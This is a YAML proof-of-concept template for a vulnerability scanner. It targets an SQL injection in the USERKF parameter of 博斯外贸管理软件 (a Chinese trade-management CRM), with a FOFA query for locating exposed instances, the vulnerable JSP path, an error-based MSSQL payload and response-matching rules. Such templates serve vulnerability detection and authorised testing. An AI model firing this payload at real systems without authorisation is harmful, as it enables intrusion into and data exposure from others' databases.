id: poc-yaml-51boss-userkf-sqli
info:
  name: 博斯外贸管理软件 USERKF SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 博斯外贸管理软件
  fofa: title="欢迎使用 博斯软件"
requests:
- method: POST
  path: /crm/module/DCreceiveBox.jsp
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: USERKF=1')and+1=@@version--
  expression: status_code == 200 && contains(body,"java.sql.SQLException") && contains(body,"Microsoft
    SQL Server") && contains(gbk_decode(body),"转换为数据类型为") && contains(gbk_decode(body),"发生语法错误")
variables: {}
transport: http
